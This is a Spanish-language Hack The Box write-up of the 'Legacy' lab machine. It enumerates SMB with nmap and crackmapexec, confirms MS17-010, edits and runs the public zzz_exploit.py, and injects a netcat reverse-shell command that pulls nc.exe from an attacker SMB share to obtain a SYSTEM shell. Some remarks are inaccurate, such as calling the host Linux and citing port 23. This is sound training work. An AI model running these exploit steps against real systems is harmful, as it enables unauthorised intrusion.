# HACK THE BOX PEN - TESTING LABS
## MACHINE LEGACY
> ![alt text](https://i.postimg.cc/65rgSLm6/Legacy.png)
---

### Sinopsis 
demuestra los potenciales riesgos de seguridad de SMB en Windows. Sólo se requiere un exploit disponible públicamente para obtener
acceso de administrador
### Habilidades Aprendidas

> * Enumeración y escaneo.
> * Conexion remota con Netcat.
> * SMB Enumeration Eternalblue Exploitation (MS17-010) [Triple Z Exploit]
> * Identificación de servicios vulnerables
> * Explotación de SMB
> * EthernalBlue


## Enumeración y Escaneo

Para iniciar la fase de reconocimiento, se puede verificar la conectividad del equipo víctima; para esto se puede usar el protocolo _ICMP_, y con el _ttl_ obtenido se puede verificar la version del sistema.

#### Validación de conectividad.
```java
ping -c 1 10.10.10.4
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=63 time=91.7 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 91.713/91.713/91.713/0.000 ms

```
>*_Nota_*: el parametro *_-c_* de la traza icmp, permite enviar los paquetes asignados para la prueba, en el ejemplo anterior un solo paquete. Y como se pude interpretar, el ttl corresponde a una maquina linux.

### Escaneo y enumeración de servicios
Para la etapa de identificación de viulnerabilidades utilizamos la herramienta *_nmap_*, que servirá para verificar los servicioes y puertos expuestos.

#### Identicación de puertos y servicios con nmap. 65535 Puertos.
```java
# nmap -p- --open -T5 -v -n -oG allPorts 10.10.10.4
# nmap  -p- --open -sS --min-rate 5000-vvv -n -Pn 10.10.10.4 -oG allPorts
```
A continuación el significado de los parametros de nmap.

>* *_-p-_*: Ejecuta la validación sobre todos los puertos 65535.
>* *_-T[0-5]_*: Corresponde a la plantilla del temporizado entre mas alto es el numero, el escaneo es mas rapido y mas ruidoso o intrusivo, el numero 5 es ideal para entornos controlados.
>* *_-v_*: Aumentar el nivel de mensajes detallados (use -vvv para aumentar el efecto).
>* *_-n_*: Le indica a Nmap que nunca debe realizar resolución DNS inversa de las direcciones IP activas que encuentre. Ya que DNS es generalmente lento, esto acelera un poco las cosas.
> * *_-Pn_*: Este parametro evita que se aplique resolución de host discovery, a travéz del protocolo arp.
> * *_-oG_*: -oN/-oX/-oS/-oG \<file>: Guardar el sondeo en formato normal, y Grepeable (para usar con grep) respectivamente, al archivo indicado.
> * *_sS_*: Análisis TCP SYN/Connect()/ACK.
> * *_--min-rate 5000_*: emite paquete no mas lentos a 5000 paquetes por segundo.
> * *_--open_*: muestra solo los puertos abiertos.

#### Resultado formato grepeable -oG

```java
File: allPorts
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# Nmap 7.93 scan initiated Tue Jan 24 21:36:08 2023 as: nmap -p- --open --min-rate 5000 -vvvv -n -Pn -oG allPorts 10.10.10.4
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.4 () Status: Up
Host: 10.10.10.4 () Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///
# Nmap done at Tue Jan 24 21:36:46 2023 -- 1 IP address (1 host up) scanned in 37.61 seconds
```
Una vez escaneado se puede evidenciar que encontró abierto los puertos 23, para lo que se puede ejecutar un escaneo mejorado a nivel se scritps con nmap.
```java
  nmap -p135,139,445 -sCV -vvvv 10.10.10.4 -oN targeted
```
#### Resultado formato nmap
```java
───────────────────────────────────────────────────────────────────────────────────────────────────────────────
File: targeted
───────────────────────────────────────────────────────────────────────────────────────────────────────────────
# Nmap 7.93 scan initiated Tue Jan 24 21:40:20 2023 as: nmap -p135,139,445 -sCV -vvvv -oN targeted 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up, received echo-reply ttl 127 (0.29s latency).
Scanned at 2023-01-24 21:40:21 -05 for 25s

PORT    STATE SERVICE      REASON          VERSION
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h57m38s, deviation: 1h24m49s, median: 4d23h57m39s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-01-30T06:38:11+02:00
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b9cf1f (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   005056b9cf1f0000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40600/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 24079/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50902/udp): CLEAN (Failed to receive data)
|   Check 4 (port 60559/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 24 21:40:46 2023 -- 1 IP address (1 host up) scanned in 25.85 seconds
───────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
#### Enumeración de recursos compartidos utilzando crackmapexec 
Aprovechando que el puerto smb esta abierto podemo ennumerar los recursos compartidos utilzando crackmapexec.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# crackmapexec smb 10.10.10.4
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Initializing LDAP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
```
Para listar los recursos compartidos podemos utilizar el flag `--share`, sin embargo, se puede evidenciar que no hay recursos compartidos en la red

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# crackmapexec smb 10.10.10.4 -u 'null' -p '' --shares           
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.10.10.4      445    LEGACY           [-] legacy\null: STATUS_LOGON_FAILURE 
```  
Verificando aque tiene una versio de windows antigua podemos buscar un script en nmap para verificar la vulnerabilidad mediante nmap
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u 
"auth"
"broadcast"
"brute"
"default"
"discovery"
"dos"
"exploit"
"external"
"fuzzer"
"intrusive"
"malware"
"safe"
"screenshot"
"version"
"vuln"
```
Con las categorias identificadas podemos buscar mediante nmao la vulnerabilidad y del servicio smb.

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/nmap]
└─# cat smb-vuln -l java
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: smb-vuln
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.93 scan initiated Tue Jan 24 22:40:38 2023 as: nmap --script "vuln and safe" -p 445 -oN smb-vuln 10.10.10.4
   2   │ Nmap scan report for 10.10.10.4
   3   │ Host is up (0.94s latency).
   4   │ 
   5   │ PORT    STATE SERVICE
   6   │ 445/tcp open  microsoft-ds
   7   │ 
   8   │ Host script results:
   9   │ | smb-vuln-ms17-010: 
  10   │ |   VULNERABLE:
  11   │ |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  12   │ |     State: VULNERABLE
  13   │ |     IDs:  CVE:CVE-2017-0143
  14   │ |     Risk factor: HIGH
  15   │ |       A critical remote code execution vulnerability exists in Microsoft SMBv1
  16   │ |        servers (ms17-010).
  17   │ |           
  18   │ |     Disclosure date: 2017-03-14
  19   │ |     References:
  20   │ |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
  21   │ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
  22   │ |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
  23   │ 
  24   │ # Nmap done at Tue Jan 24 22:41:09 2023 -- 1 IP address (1 host up) scanned in 31.05 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Se puede idenfiticar que es vulnerable para RCE, por lo que, podemos utilizar un script basado en al vulnerabilidad `MS17-010`

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/exploits]
└─# git clone https://github.com/worawit/MS17-010.git                                                                                                   
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
Recibiendo objetos: 100% (183/183), 113.61 KiB | 573.00 KiB/s, listo.
Resolviendo deltas: 100% (102/102), listo.
```
Para verificar si es explotabel ejecutamos el `cheker.py`, y vemos que tenemos una respuesta correcta de lso named pipes, en este caso browser.
```java
┌──(root㉿kali)-[/home/…/HTB/legacy/exploits/MS17-010]
└─# python2 checker.py 10.10.10.4
Target OS: Windows 5.1
The target is not patched
=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
```
Con esto se puede utilizar el archivo `zzz_exploit.py`, por lo que, debemos modificar varias lineas del archivo para optimizar el exploit, se deben comentar 6 lineas.
```java
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()                  # Esta linea anteponiendo # al inicio
	print('creating file c:\\pwned.txt on the target')  # Esta linea anteponiendo # al inicio
	tid2 = smbConn.connectTree('C$')                    # Esta linea anteponiendo # al inicio
	fid2 = smbConn.createFile(tid2, '/pwned.txt')       # Esta linea anteponiendo # al inicio
	smbConn.closeFile(tid2, fid2)                       # Esta linea anteponiendo # al inicio
	smbConn.disconnectTree(tid2)                        # Esta linea anteponiendo # al inicio
```	
Para verificar si hay ejecucion remota de código, modificamos la línea :
```java
#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
```
Y la reemplazamos por 
```java
service_exec(conn, r'cmd /c ping 10.10.16.15')
```

El resultado de las modificaciones debe ser la siguiente
```java
def smb_pwn(conn, arch):
	#smbConn = conn.get_smbconnection()

	#print('creating file c:\\pwned.txt on the target')
	#tid2 = smbConn.connectTree('C$')
	#fid2 = smbConn.createFile(tid2, '/pwned.txt')
	#smbConn.closeFile(tid2, fid2)
	#smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	service_exec(conn, r'cmd /c ping 10.10.16.15')
```
Con la modificaciones realizadas, realizamos una prueba de conexion poniendo en escucha una conexion icpm mediante tcpdump. Para lanzar el exploit debemos ejecutar el exploit con el named pipes encontrado.

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/nmap]
└─# tcpdump -i tun0 icmp -n -v 
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
> * **-i.-** Flag para especificar interface.
> * **tun0.-** Nombre la interface que se pone en escucha.
> * **-n.-** Flag que evita resolucion dns.
> * **-v.-** Flag verbose.

Una vez puesto en escucha la comunicacion icmp, ejecutamos el exploit con el named pipes encontrado.

```java                                            
┌──(root㉿kali)-[/home/…/HTB/legacy/exploits/MS17-010]
└─# python2 zzz_exploit.py 10.10.10.4 browser
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8613eb18
SESSION: 0xe23a0480
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1097608
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe10976a8
overwriting token UserAndGroups
Opening SVCManager on 10.10.10.4.....
Creating service AZmL.....
Starting service AZmL.....
SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
Removing service AZmL.....
Done
```
Resultado de la escucha del tcpdump.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/nmap]
└─# tcpdump -i tun0 icmp -n    
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
00:04:16.890581 IP 10.10.10.4 > 10.10.16.15: ICMP echo request, id 512, seq 1280, length 40
00:04:16.890815 IP 10.10.16.15 > 10.10.10.4: ICMP echo reply, id 512, seq 1280, length 40
00:04:17.822968 IP 10.10.10.4 > 10.10.16.15: ICMP echo request, id 512, seq 1536, length 40
00:04:17.823039 IP 10.10.16.15 > 10.10.10.4: ICMP echo reply, id 512, seq 1536, length 40
00:04:18.822949 IP 10.10.10.4 > 10.10.16.15: ICMP echo request, id 512, seq 1792, length 40
00:04:18.822990 IP 10.10.16.15 > 10.10.10.4: ICMP echo reply, id 512, seq 1792, length 40
00:04:19.829622 IP 10.10.10.4 > 10.10.16.15: ICMP echo request, id 512, seq 2048, length 40
00:04:19.829990 IP 10.10.16.15 > 10.10.10.4: ICMP echo reply, id 512, seq 2048, length 40
```
Para estabelcer un conexion reverasr podempos utilizar nc del directorio de seclist.

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# ls           
nc.exe
```
Para compartir el archivo usamos un servidor smbfolder.py y compartimos un recusos asignando la ruta HOME_USER

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# smbserver.py smbFolder $(pwd)                    
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
En la parte de inyeccion de comando del exploit triple Z, modificamos la linea que permitia inyeccion de comandos.
```java
service_exec(conn, r'cmd /c \\10.10.16.15\smbFolder\nc.exe -e cmd 10.10.16.15 443')
```

Antes de emitir el exploit debemos levantar una conexión nc utilizando la herramienta rlwrap, para tener una shell interactiva.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# rlwrap nc -nlvp 443 
listening on [any] 443 ...
```
Cuando se ejecuta el exploit veremos que se conecta al recurso compartido y de ahi ejecuta la conexion nc.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# smbserver.py smbFolder $(pwd)                    
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.4,1035)
[*] AUTHENTICATE_MESSAGE (\,LEGACY)                                                                                                                                                         
[*] User LEGACY\ authenticated successfully
```
Conexion realizada mediante netcat.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
└─# rlwrap nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.10.4] 1037
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
```

ya adentro nos movilizamos por todas las rutas para encontrar la flag.